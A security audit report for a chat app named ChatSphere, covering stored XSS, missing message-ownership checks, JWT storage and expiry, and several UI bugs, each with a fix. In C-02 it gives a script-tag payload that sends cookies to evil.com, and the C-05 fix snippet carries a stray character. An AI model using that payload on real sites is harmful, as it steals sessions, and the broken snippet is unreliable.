# ChatSphere — Audit Report

---

## C-01 · XSS: Message content rendered as raw HTML
**Severity:** Critical | **Type:** Frontend | **File:** `public/index.html:1025, 1046, 1152`

User message content is injected directly into `innerHTML` without sanitisation.

```js
// VULNERABLE — appendMessage
<div class="message-content">${msg.content}</div>

// VULNERABLE — updateEditedMessage (WebSocket edit event)
contentEl.innerHTML = content;

// VULNERABLE — appendDmMessage
<div class="message-content">${msg.content}</div>
```

A stored XSS vulnerability allows users to inject malicious JavaScript that is saved in the database and automatically executes in every user's browser when they open the room.

**Fix:** Set content via `textContent`, or escape `<`, `>`, `&` and `"` before interpolating.

```js
function escapeHtml(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// appendMessage / appendDmMessage
<div class="message-content">${escapeHtml(msg.content)}</div>

// updateEditedMessage. Use textContent instead of innerHTML.
contentEl.textContent = content;
```

---

## C-02 · XSS: Room names and display names rendered as raw HTML
**Severity:** Critical | **Type:** Frontend | **File:** `public/index.html:905, 927, 951`

Room names, display names, and avatars are also interpolated into `innerHTML` without escaping.

```js
// VULNERABLE — renderRoomList
el.innerHTML = `...<span class="room-name">${room.name}</span>...`;

// VULNERABLE — renderDmList
el.innerHTML = `...<span class="dm-name">${displayUser.displayName}</span>...`;

// VULNERABLE — renderOnlineUsers
el.innerHTML = `...<span class="user-name">${user.displayName}</span>...`;
```

A user who registers with a display name like `<script>fetch('https://evil.com?c='+document.cookie)</script>` will execute code in every other user's browser as soon as they load the sidebar.

**Fix:** Use `escapeHtml` (defined in C-01) on all user-supplied strings before injecting into `innerHTML`, or build the DOM with `createElement` + `textContent`.


---

## C-04 · Any authenticated user can edit or delete other users' messages
**Severity:** Critical | **Type:** Backend | **File:** `src/server.js:310-361`

Neither `PUT /api/messages/:id` nor `DELETE /api/messages/:id` checks that the requesting user owns the message.

```js
// PUT — no ownership check
const message = queryOne('SELECT * FROM messages WHERE id = ?', [messageId]);
if (!message) return res.status(404).json({ error: 'Message not found' });
// immediately updates without verifying req.user.id === message.userId

// DELETE — same problem
runSql('DELETE FROM messages WHERE id = ?', [messageId]);
```

Any logged-in user can edit or delete any message in any room by hitting the API directly with `curl` or Postman.

**Fix:** Verify ownership before mutating.

```js
if (message.userId !== req.user.id) {
  return res.status(403).json({ error: 'Cannot modify another user\'s message' });
}
```

---

## C-05 · JWT token stored in localStorage
**Severity:** Critical | **Type:** Frontend | **File:** `public/index.html:786-787, 1305-1310`

The JWT is written to and read from `localStorage`.

```js
// On login
localStorage.setItem('token', token);
localStorage.setItem('user', JSON.stringify(currentUser));

// On page load
const savedToken = localStorage.getItem('token');
```

`localStorage` is readable by any JavaScript on the page. The stored XSS vulnerabilities in C-01 and C-02 make this directly exploitable: a malicious message can silently exfiltrate the token.

**Fix:** Use `HttpOnly; Secure; SameSite=Strict` cookies set by the server. The browser sends them automatically on every request and JavaScript cannot read them.

```js
// server.js — set cookie on login instead of returning token in body
res.cookie('token', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict'S
});
res.json({ user: { id, email, displayName, avatar } });
```

---

## H-01 · JWT tokens never expire
**Severity:** High | **Type:** Backend | **File:** `src/server.js:96, 133`

Both register and login sign tokens with no `expiresIn` option.

```js
const token = jwt.sign({ id, email, displayName }, JWT_SECRET);
```

A stolen token (via XSS, log leak, or shoulder surfing) is valid forever. There is no way to invalidate a compromised session short of rotating the entire JWT secret, which logs out every user.

**Fix:** Set a reasonable expiry.

```js
const token = jwt.sign({ id, email, displayName }, JWT_SECRET, { expiresIn: '7d' });
```

---

## H-02 · DM list always shows the current user's own name and avatar
**Severity:** High | **Type:** Frontend | **File:** `public/index.html:935-940`

`getDmDisplayUser` has its conditional backwards. Because `otherUsers` already excludes the current user (line 917), the `if` branch is unreachable and the `else` always runs, returning the current user's own data for every contact.

```js
function getDmDisplayUser(user) {
  if (user.id === currentUser.id) {            // never true — filtered out above
    return { displayName: user.displayName, avatar: user.avatar };
  } else {
    return { displayName: currentUser.displayName, avatar: currentUser.avatar }; // always runs
  }
}
```

Every entry in the DM sidebar shows your own name and avatar, making it impossible to tell who you are messaging.

**Fix:** Remove the dead condition — the function receives only other users.

```js
function getDmDisplayUser(user) {
  return { displayName: user.displayName, avatar: user.avatar };
}
```

---

## H-03 · DM messages always display the sender's name, even for received messages
**Severity:** High | **Type:** Frontend | **File:** `public/index.html:1140`

Both branches of the ternary use `msg.senderName`.

```js
const name = isSender ? msg.senderName : msg.senderName; // identical branches
```

Every message in a DM conversation appears to come from the same person, making the conversation unreadable.

**Fix:**

```js
const name = isSender ? msg.senderName : msg.receiverName;
```

---

## H-04 · Typing indicator never clears
**Severity:** High | **Type:** Frontend | **File:** `public/index.html:1170-1173`

The timeout callback writes the same text again instead of clearing it.

```js
typingTimeouts[displayName] = setTimeout(() => {
  indicator.textContent = `${displayName} is typing...`; // re-sets instead of clearing
}, 3000);
```

Once someone types, the indicator stays visible permanently, even when nobody is typing.

**Fix:**

```js
typingTimeouts[displayName] = setTimeout(() => {
  indicator.textContent = '';
}, 3000);
```


---

## L-01 · CSS variable `--text-muted` has an invalid 7-digit hex colour
**Severity:** Low | **Type:** Frontend | **File:** `public/index.html:18`

```css
--text-muted: #6868808; /* 7 digits — invalid */
```

The browser ignores the declaration. Any element using `var(--text-muted)` falls back to an unintended inherited colour or renders with no colour at all.

**Fix:**

```css
--text-muted: #686880;
```
